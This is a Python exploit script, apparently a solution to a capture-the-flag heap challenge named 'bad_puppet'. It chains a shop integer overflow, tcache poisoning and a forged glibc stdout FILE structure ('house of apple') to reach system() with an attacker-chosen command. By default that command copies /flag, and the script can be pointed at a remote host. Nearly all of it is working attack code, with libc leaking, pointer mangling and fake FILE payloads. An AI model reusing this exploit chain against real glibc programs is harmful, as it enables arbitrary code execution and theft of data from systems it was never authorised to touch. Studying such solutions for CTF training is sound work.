"""bad_puppet: u32 shop overflow -> ring -> stale-drop dup -> tcache poison ->
_IO_2_1_stdout_ fake FILE -> house of apple (narrow flush clause) -> system()."""
import sys, time, struct
from pwn import *
from game import Game

LIBC_STDOUT = 0x2055C0
LIBC_STDERR = 0x2054E0
LIBC_STDIN  = 0x2048E0
LIBC_WFILE  = 0x203228
LIBC_STDFILE1_LOCK = 0x206710
UNSORTED_OFF = 0x204B20

def p64(x): return (x & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
def mangle(base, target): return (target ^ (base >> 12)) & 0xFFFFFFFFFFFFFFFF

def log(*a):
    print(*a); sys.stdout.flush()

def whisper_sync(g, idx, payload):
    """whisper and wait until the main-world thread actually wrote the ring."""
    g.buf = b""
    g.cmd("mw whisper %d %s" % (idx, bytes(payload).hex()), 0.2)
    for _ in range(12):
        if b"whispered to ring" in g.buf:
            return True
        g.drain(0.2)
    return b"whispered to ring" in g.buf

class Sol:
    def __init__(self, g): self.g = g
    def solve(self, drop_id=None, mirror_id=None, mirror_kind=None, tries=3, buy=False):
        g = self.g
        for t in range(tries):
            items = g.inv(); n = len(items)
            for s in range(n):
                it = items[s]; mir = n - 1 - s
                if drop_id is not None and it["id"] != drop_id: continue
                m = items[mir]
                if mirror_id is not None and m["id"] != mirror_id: continue
                if mirror_kind == "ring" and m["type"] != "Ring": continue
                if mirror_kind == "nonring" and m["type"] == "Ring": continue
                return s
            g.cmd("inv sort", 0.3)
        if buy:
            g.cmd("shop buy 1 1", 0.5)
            return self.solve(drop_id, mirror_id, mirror_kind, 2, False)
        return None

DIAG_SLEEP = False

def exploit_once(host, port, cmdstr, retries=90):
    """returns all text received after quit (should contain the flag)"""
    g = Game(host=host, port=port, retries=retries)
    try:
        return _run(g, cmdstr)
    finally:
        try: g.io.close()
        except Exception: pass

def _run(g, cmdstr):
    sv = Sol(g)
    g.game_setup()
    made = 0
    for k in range(15):
        if g.dup_ring() is None: break
        made += 1
    rings = [i for i in g.inv() if i["type"] == "Ring"]
    log("[*] dups:", made, "rings:", len(rings))
    if len(rings) < 16: return ""
    for k in range(9):
        if g.equip_sell() is None: break
    eqs, _ = g.world()
    libc = None
    for e in eqs:
        for v in (e["head"], e["key"]):
            if v and 0x700000000000 <= v < 0x800000000000:
                cand = v - UNSORTED_OFF
                if cand & 0xFFF == 0: libc = cand
    if not libc:
        log("[-] leak failed"); return ""
    libcel = ELF("/home/ubuntu/pwn/bp/bad_puppet/libs/libc.so.6", checksec=False)
    system = libc + libcel.symbols["system"]
    global DIAG_SLEEP
    if DIAG_SLEEP:
        system = libc + libcel.symbols["sleep"]
    S_ = libc + LIBC_STDOUT
    log("[*] libc:", hex(libc), "stdout:", hex(S_), "system:", hex(system))

    cmdb = cmdstr.encode() + b"\0"
    assert len(cmdb) <= 0x20, len(cmdb)
    payA = bytearray(127)
    payA[0:len(cmdb)] = cmdb
    payA[0x28:0x30] = p64(1)          # narrow clause: write_ptr > write_base
    payB = bytearray(127)
    def setb(off, val): payB[off-0x80:off-0x80+8] = p64(val)
    setb(0x88, libc + LIBC_STDFILE1_LOCK)  # _lock (fflush locks it)
    setb(0x90, system)                     # V+0x68 = system
    setb(0xA0, S_ + 0x08)                  # _wide_data = W
    setb(0xC0, 0)                          # _mode <= 0
    setb(0xD8, libc + LIBC_WFILE)          # vtable = _IO_wfile_jumps
    setb(0xE0, S_ + 0x28)                  # W+0xE0 = _wide_vtable = V
    setb(0xE8, S_ + 0x28)

    X = [i for i in g.inv() if i["type"] == "Ring"][0]

    def sync_dest(expected):
        for _ in range(12):
            eqs, _ = g.world()
            if len(eqs) >= expected:
                return eqs
            time.sleep(0.3)
        return g.world()[0]

    def cycle(payload, Tfixed=None, termX=False, tag=""):
        base, _ = g.world()
        base_n = len(base)
        xi = [i for i in g.inv() if i["id"] == X["id"]][0]["idx"]
        g.cmd("inv equip %d" % xi, 0.35)
        eqs = sync_dest(base_n + 1)          # X now in dest
        if eqs[-1]["addr"] is None: log("[-] X equip fail"); return None
        xd = eqs[-1]["idx"]; xaddr = eqs[-1]["addr"]
        T = xaddr if termX else Tfixed
        pl = bytearray(payload)
        if termX: pl[0:8] = p64(xaddr >> 12)
        if not whisper_sync(g, xd, bytes(pl)): log("[-] X whisper fail"); return None
        g.cmd("inv unequip %d" % xi, 0.35)
        for k in range(2):
            cand = [i for i in g.inv() if i["type"] == "Ring" and i["id"] != X["id"]]
            if not cand: log("[-] no fill ring"); return None
            R = cand[0]
            g.cmd("inv equip %d" % R["idx"], 0.35)
            s = sv.solve(drop_id=R["id"], mirror_kind="nonring", buy=True)
            if s is None: log("[-] no fill slot"); return None
            ok, rid, rtyp = g.stale_drop(s)
            if not ok: log("[-] fill stale fail"); return None
            if rtyp == "Ring": log("[!] fill mirror ring", rid)
        # both fills freed R1,R2 -> dest grew by 2 (X was unequipped)
        eqs = sync_dest(base_n + 2)
        hd, ha = eqs[-1]["idx"], eqs[-1]["addr"]
        j = bytearray(127); j[0:8] = p64(mangle(ha, T))
        if not whisper_sync(g, hd, bytes(j)): log("[-] poison whisper fail"); return None
        for k in range(2):
            s = sv.solve(mirror_id=X["id"], mirror_kind="ring", buy=True)
            if s is None: log("[-] no dup slot"); return None
            ok, rid, rtyp = g.stale_drop(s)
            if not ok: log("[-] dup stale fail"); return None
            if rid != X["id"]: log("[!] dup mirror mismatch", rid, X["id"], rtyp)
        log("[*] cycle %s done T=%s" % (tag, hex(T)))
        return T

    cycle(bytes(payA), Tfixed=S_, tag="A")
    cycle(bytes(payB), Tfixed=S_ + 0x80, tag="B")
    if "verify" in sys.argv:
        eqs, drops = g.world()
        log("[verify] drops:", [d["body"] for d in drops])
        for d in drops:
            if d["is_ring"]:
                g.cmd("mw pickup %d" % d["idx"], 0.5)
                items = g.inv()
                fake = items[-1] if items else None
                if fake and fake["type"] == "Ring":
                    g.cmd("inv equip %d" % fake["idx"], 0.4)
                    eqs2, _ = g.world()
                    for e in eqs2:
                        if e["addr"] is not None:
                            log("[verify] equipped addr=%s head=%s key=%s" % (hex(e["addr"]), hex(e["head"]), hex(e["key"])))
                break
        return "verify_done"
    cycle(bytes(127), termX=True, tag="C")
    if "dump" in sys.argv and g.proc is not None:
        try:
            mem = open("/proc/%d/mem" % g.proc.pid, "rb", 0)
            mem.seek(S_)
            data = mem.read(0x150)
            for off in range(0, 0x150, 16):
                log("  +%#04x: %s" % (off, " ".join("%016x" % struct.unpack("<Q", data[off+i:off+i+8])[0] for i in (0,8))))
        except Exception as e:
            log("dump err", e)
    log("[*] quit")
    g.buf = b""
    g.cmd("quit", 0.3)
    g.drain(20.0)
    if DIAG_SLEEP:
        log("[*] alive after quit:", (not g.dead))
    return g.buf.decode(errors="replace")

if __name__ == "__main__":
    remote_mode = len(sys.argv) > 1 and sys.argv[1] == "remote"
    if "sleeptest" in sys.argv:
        DIAG_SLEEP = True
    cmdstr = "dd if=/flag of=/tmp/leakout"
    for a in sys.argv:
        if a.startswith("cmd="): cmdstr = a[4:]
    if remote_mode:
        host, port = sys.argv[2], int(sys.argv[3]) if len(sys.argv) > 3 else 0
        out = exploit_once(host, port, cmdstr)
    else:
        g = Game(mode="socket")
        out = _run(g, cmdstr)
        try:
            log("[*] exit:", g.proc.poll())
            log("[*] stderr:", g.proc.recvall(timeout=2)[-400:])
        except Exception as e:
            log("[*] err", e)
    log("=== OUT ===")
    sys.stdout.write(out)
